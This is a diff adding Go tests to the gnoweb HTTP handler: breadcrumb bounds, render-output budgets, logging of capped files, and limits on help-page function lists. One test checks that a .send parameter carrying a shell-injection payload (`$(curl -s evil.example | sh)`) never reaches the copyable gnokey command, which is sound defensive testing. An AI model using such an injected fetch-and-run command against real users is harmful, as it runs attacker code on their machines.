@@ -155,6 +155,31 @@ func TestHTTPHandler_Get_InvalidPathNotEchoedToLog(t *testing.T) {
 	assert.Contains(t, logs.String(), fmt.Sprintf("path_length=%d", len(path)))
 }
 
+// Each breadcrumb link carries the segments before it, so a row past the bound
+// folds the rest into its last link rather than growing with the square of
+// the segment count.
+func TestGenerateBreadcrumbPaths_Bounded(t *testing.T) {
+	t.Parallel()
+
+	segs := strings.Repeat("a/", 100) + "z"
+	u, err := weburl.Parse("/r/" + segs + "/:" + segs)
+	require.NoError(t, err)
+
+	data := gnoweb.GenerateBreadcrumbPaths(u, "")
+	require.Len(t, data.Parts, gnoweb.MaxBreadcrumbParts)
+	require.Len(t, data.ArgParts, gnoweb.MaxBreadcrumbParts)
+
+	// The path row shows "r" and 14 segments, then the 86 left and "z".
+	lastPart := data.Parts[len(data.Parts)-1]
+	require.Equal(t, "/r/"+segs, lastPart.URL)
+	require.Equal(t, strings.Repeat("a/", 86)+"z", lastPart.Name)
+
+	// The argument row shows 15 segments, then the 85 left and "z".
+	lastArg := data.ArgParts[len(data.ArgParts)-1]
+	require.Equal(t, u.Path+":"+segs, lastArg.URL)
+	require.Equal(t, strings.Repeat("a/", 85)+"z", lastArg.Name)
+}
+
 // newTestHandlerConfig creates a HTTPHandlerConfig for tests using a stub client.
 func newTestHandlerConfig(t *testing.T, client gnoweb.ClientAdapter) *gnoweb.HTTPHandlerConfig {
 	t.Helper()
@@ -1456,19 +1481,24 @@ func TestHTTPHandler_Post_HiddenPathField(t *testing.T) {
 }
 
 // newRealRendererHelpHandler builds an HTTPHandler with a real HTMLRenderer
-// and a stubClient whose Doc() returns jdoc. Other client methods are not
-// stubbed as the $help endpoint only exercises the Doc() path.
+// and a stubClient whose Doc() returns jdoc and whose package lists no files,
+// enough for $help and the overview's symbols.
 func newRealRendererHelpHandler(t *testing.T, jdoc *doc.JSONDocumentation) *gnoweb.HTTPHandler {
 	t.Helper()
-
-	client := &stubClient{
+	return newRealRendererHandler(t, &stubClient{
 		docFunc: func(ctx context.Context, path string) (*doc.JSONDocumentation, error) {
 			return jdoc, nil
 		},
-	}
+		listFilesFunc: func(context.Context, string) ([]string, error) { return nil, nil },
+	}, io.Discard)
+}
 
+// newRealRendererHandler builds an HTTPHandler over client with a real
+// HTMLRenderer logging into rendererLog.
+func newRealRendererHandler(t *testing.T, client *stubClient, rendererLog io.Writer) *gnoweb.HTTPHandler {
+	t.Helper()
 	renderer := gnoweb.NewHTMLRenderer(
-		slog.New(slog.NewTextHandler(io.Discard, nil)),
+		slog.New(slog.NewTextHandler(rendererLog, nil)),
 		gnoweb.NewDefaultRenderConfig(),
 		client,
 	)
@@ -1484,6 +1514,188 @@ func newRealRendererHelpHandler(t *testing.T, jdoc *doc.JSONDocumentation) *gnow
 	)
 	require.NoError(t, err)
 	return h
+}
+
+// bigDoc is 120 KB of code blocks, which render about 3 MB of HTML.
+var bigDoc = strings.Repeat("```\nx\n```\n\n", 11000)
+
+// docFuncs returns n functions documented by src.
+func docFuncs(n int, src string) []*doc.JSONFunc {
+	funcs := make([]*doc.JSONFunc, n)
+	for i := range funcs {
+		name := fmt.Sprintf("F%d", i)
+		funcs[i] = &doc.JSONFunc{Name: name, Signature: "func " + name + "()", Doc: src, File: "foo.gno", Line: i + 1}
+	}
+	return funcs
+}
+
+// The third doc comment on a page finds the page's budget spent.
+func TestHTTPHandler_DocPagesShareOneRenderBudget(t *testing.T) {
+	t.Parallel()
+
+	h := newRealRendererHelpHandler(t, &doc.JSONDocumentation{Funcs: docFuncs(3, bigDoc)})
+
+	for _, page := range []string{"$help", "$source"} {
+		rec := httptest.NewRecorder()
+		h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo"+page, nil))
+		require.Equal(t, http.StatusOK, rec.Code, page)
+		assert.Equal(t, 1, bytes.Count(rec.Body.Bytes(), []byte(`class="gno-render-plaintext"`)), page)
+	}
+}
+
+// On $help the package doc shows above three doc comments that spend the
+// page's budget, so it renders before them.
+func TestGetHelpView_PackageDocRendersFirst(t *testing.T) {
+	t.Parallel()
+
+	h := newRealRendererHelpHandler(t, &doc.JSONDocumentation{PackageDoc: "hello *world*", Funcs: docFuncs(3, bigDoc)})
+
+	rec := httptest.NewRecorder()
+	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$help", nil))
+	require.Equal(t, http.StatusOK, rec.Code)
+	assert.Contains(t, rec.Body.String(), "<em>world</em>")
+}
+
+// A README of 2,000 empty forms renders about 6 MB, so on the overview a doc
+// comment of about 3 MB finds the page's budget spent.
+func TestHTTPHandler_OverviewDocsGetWhatTheReadmeLeft(t *testing.T) {
+	t.Parallel()
+
+	readme := []byte(strings.Repeat("<gno-form exec=\"F\">\n</gno-form>\n\n", 2000))
+	h := newRealRendererHandler(t, &stubClient{
+		docFunc: func(context.Context, string) (*doc.JSONDocumentation, error) {
+			return &doc.JSONDocumentation{Funcs: docFuncs(1, bigDoc)}, nil
+		},
+		listFilesFunc: func(context.Context, string) ([]string, error) { return []string{"README.md"}, nil },
+		fileFunc: func(_ context.Context, _, name string) ([]byte, gnoweb.FileMeta, error) {
+			return readme, gnoweb.FileMeta{}, nil
+		},
+	}, io.Discard)
+
+	rec := httptest.NewRecorder()
+	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$source", nil))
+	require.Equal(t, http.StatusOK, rec.Code)
+	assert.Equal(t, 1, bytes.Count(rec.Body.Bytes(), []byte(`class="gno-render-plaintext"`)))
+}
+
+// 50,000 blank lines highlight past the cap, and the log line names the file
+// with its package path.
+func TestGetSourceView_OverOutputCapLogsPackagePath(t *testing.T) {
+	t.Parallel()
+
+	var logs bytes.Buffer
+	h := newRealRendererHandler(t, &stubClient{
+		listFilesFunc: func(context.Context, string) ([]string, error) { return []string{"a.gno"}, nil },
+		fileFunc: func(context.Context, string, string) ([]byte, gnoweb.FileMeta, error) {
+			return bytes.Repeat([]byte("\n"), 50_000), gnoweb.FileMeta{}, nil
+		},
+	}, &logs)
+
+	rec := httptest.NewRecorder()
+	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$source&file=a.gno", nil))
+	require.Equal(t, http.StatusOK, rec.Code)
+	assert.Contains(t, rec.Body.String(), "gno-render-plaintext")
+	assert.Contains(t, logs.String(), "path=/r/demo/foo/a.gno ")
+}
+
+// 4,000 empty forms render past the cap, and the README's log line names the
+// file, apart from the realm's own Render output.
+func TestGetSourceView_OverOutputCapLogsReadmePath(t *testing.T) {
+	t.Parallel()
+
+	var logs bytes.Buffer
+	h := newRealRendererHandler(t, &stubClient{
+		listFilesFunc: func(context.Context, string) ([]string, error) { return []string{"README.md"}, nil },
+		fileFunc: func(context.Context, string, string) ([]byte, gnoweb.FileMeta, error) {
+			return []byte(strings.Repeat("<gno-form exec=\"F\">\n</gno-form>\n\n", 4000)), gnoweb.FileMeta{}, nil
+		},
+	}, &logs)
+
+	rec := httptest.NewRecorder()
+	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$source&file=README.md", nil))
+	require.Equal(t, http.StatusOK, rec.Code)
+	assert.Contains(t, rec.Body.String(), "gno-render-plaintext")
+	assert.Contains(t, logs.String(), "path=/r/demo/foo/README.md ")
+}
+
+// $help lists as many functions as the overview, and ?func= still reaches the
+// ones past them.
+func TestGetHelpView_StopsAtMaxHelpFunctions(t *testing.T) {
+	t.Parallel()
+
+	h := newRealRendererHelpHandler(t, &doc.JSONDocumentation{Funcs: docFuncs(components.MaxHelpFunctions+1, "")})
+
+	rec := httptest.NewRecorder()
+	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$help", nil))
+	require.Equal(t, http.StatusOK, rec.Code)
+	assert.Equal(t, components.MaxHelpFunctions, strings.Count(rec.Body.String(), `<article class="b-action-function"`))
+	assert.Contains(t, rec.Body.String(), "more functions than are shown here")
+
+	last := fmt.Sprintf("F%d", components.MaxHelpFunctions)
+	rec = httptest.NewRecorder()
+	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$help&func="+last, nil))
+	require.Equal(t, http.StatusOK, rec.Code)
+	assert.Contains(t, rec.Body.String(), `id="func-`+last+`"`)
+	assert.NotContains(t, rec.Body.String(), "more functions than are shown here")
+
+	h = newRealRendererHelpHandler(t, &doc.JSONDocumentation{Funcs: docFuncs(components.MaxHelpFunctions, "")})
+	rec = httptest.NewRecorder()
+	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$help", nil))
+	assert.NotContains(t, rec.Body.String(), "more functions than are shown here", "every function is shown")
+}
+
+// A function's card repeats its name for each parameter, so a 1,100-byte name
+// and 1,000 parameters write about 3 MB: the page's budget holds two cards, and
+// the list stops at the third, before a small fourth.
+func TestGetHelpView_ChargesFunctionCards(t *testing.T) {
+	t.Parallel()
+
+	funcs := make([]*doc.JSONFunc, 3)
+	for i := range funcs {
+		name := fmt.Sprintf("F%d", i) + strings.Repeat("x", 1100)
+		funcs[i] = &doc.JSONFunc{Name: name, Signature: "func " + name + "()"}
+		for j := range 1000 {
+			funcs[i].Params = append(funcs[i].Params, &doc.JSONField{Name: fmt.Sprintf("p%d", j), Type: "int"})
+		}
+	}
+	funcs = append(funcs, &doc.JSONFunc{Name: "G", Signature: "func G()"})
+	h := newRealRendererHelpHandler(t, &doc.JSONDocumentation{Funcs: funcs})
+
+	rec := httptest.NewRecorder()
+	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$help", nil))
+	require.Equal(t, http.StatusOK, rec.Code)
+	assert.Equal(t, 2, strings.Count(rec.Body.String(), `<article class="b-action-function"`))
+	assert.Contains(t, rec.Body.String(), "more functions than are shown here")
+}
+
+// A function's line in the table of contents names each parameter, so cards of
+// 20 parameters of 200-byte names fill the page's 8 MiB with about 1 MB of
+// table of contents beside them, unless that line is charged with its card;
+// charged twice over, the list stops short of filling the page.
+func TestGetHelpView_ChargesTocItems(t *testing.T) {
+	t.Parallel()
+
+	get := func(funcs []*doc.JSONFunc) string {
+		h := newRealRendererHelpHandler(t, &doc.JSONDocumentation{Funcs: funcs})
+		rec := httptest.NewRecorder()
+		h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/r/demo/foo$help", nil))
+		require.Equal(t, http.StatusOK, rec.Code)
+		return rec.Body.String()
+	}
+	funcs := make([]*doc.JSONFunc, components.MaxHelpFunctions)
+	for i := range funcs {
+		name := fmt.Sprintf("F%d", i)
+		funcs[i] = &doc.JSONFunc{Name: name, Signature: "func " + name + "()"}
+		for j := range 20 {
+			funcs[i].Params = append(funcs[i].Params, &doc.JSONField{Name: fmt.Sprintf("p%d", j) + strings.Repeat("x", 200), Type: "int"})
+		}
+	}
+
+	layout := len(get(nil))
+	page := get(funcs)
+	assert.Contains(t, page, "more functions than are shown here")
+	assert.LessOrEqual(t, len(page), layout+8<<20)
+	assert.Greater(t, len(page), layout+8<<20-64<<10)
 }
 
 func TestGetHelpView_RendersPackageDocAsHTML(t *testing.T) {
@@ -1502,6 +1714,38 @@ func TestGetHelpView_RendersPackageDocAsHTML(t *testing.T) {
 	body := rec.Body.String()
 	require.Contains(t, body, "<strong>foo</strong>", "bold markdown must render as <strong>")
 	require.NotContains(t, body, "**foo**", "literal markdown syntax must not leak")
+}
+
+// The .send value lands in the gnokey command the page offers to copy, so a
+// link carrying anything but coins must not reach it.
+func TestGetHelpView_SendMustBeCoins(t *testing.T) {
+	t.Parallel()
+
+	h := newRealRendererHelpHandler(t, &doc.JSONDocumentation{Funcs: []*doc.JSONFunc{{Name: "Hello"}}})
+
+	get := func(send string) string {
+		req := httptest.NewRequest(http.MethodGet, "/r/demo/foo$help&func=Hello&.send="+url.QueryEscape(send), nil)
+		rec := httptest.NewRecorder()
+		h.ServeHTTP(rec, req)
+		require.Equal(t, http.StatusOK, rec.Code)
+		return rec.Body.String()
+	}
+
+	body := get("1ugnot")
+	assert.Contains(t, body, `data-action-function-send-value="1ugnot"`)
+
+	body = get(`1ugnot" $(curl -s evil.example | sh) "`)
+	assert.NotContains(t, body, "data-action-function-send-value")
+	assert.NotContains(t, body, "evil.example")
+
+	// ParseCoins accepts a newline between amount and denom; the copy button
+	// drops lines starting with "/", so a raw value would cut the command.
+	body = get("1\n/gno.land/r/demo/foo:abc")
+	assert.Contains(t, body, `data-action-function-send-value="1/gno.land/r/demo/foo:abc"`)
+
+	// Whitespace alone parses as no coins, so no coin warning.
+	body = get(" ")
+	assert.NotContains(t, body, "data-action-function-send-value")
 }
 
 func TestGetHelpView_RendersFunctionDocAsHTML(t *testing.T) {
